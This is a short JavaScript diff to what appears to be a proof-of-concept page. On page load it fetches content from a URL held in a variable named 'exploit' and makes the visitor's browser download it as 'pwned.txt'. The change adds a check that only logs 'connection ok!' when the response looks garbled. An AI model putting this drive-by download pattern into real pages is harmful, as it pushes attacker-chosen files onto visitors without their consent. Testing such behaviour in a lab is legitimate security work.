@@ -14,7 +14,7 @@ function download(filename, text) {
 
 // Start file download.
 window.onload = async function () {
-	// Generate download of hello.txt file with some content
+	// Generate download of pwned.txt file with some content
 	let text = await axios.get(exploit)
 		.then((response) => {
 			return response.data;
@@ -22,7 +22,10 @@ window.onload = async function () {
 		.catch((err) => {
 			console.error(err);
 		})
-	var filename = "pwned.txt";
-
-	download(filename, text);
+	if (/\ufffd/.test(text) === false) {
+		var filename = "pwned.txt";
+		download(filename, text);
+	} else {
+		console.log("connection ok!")
+	}
 };
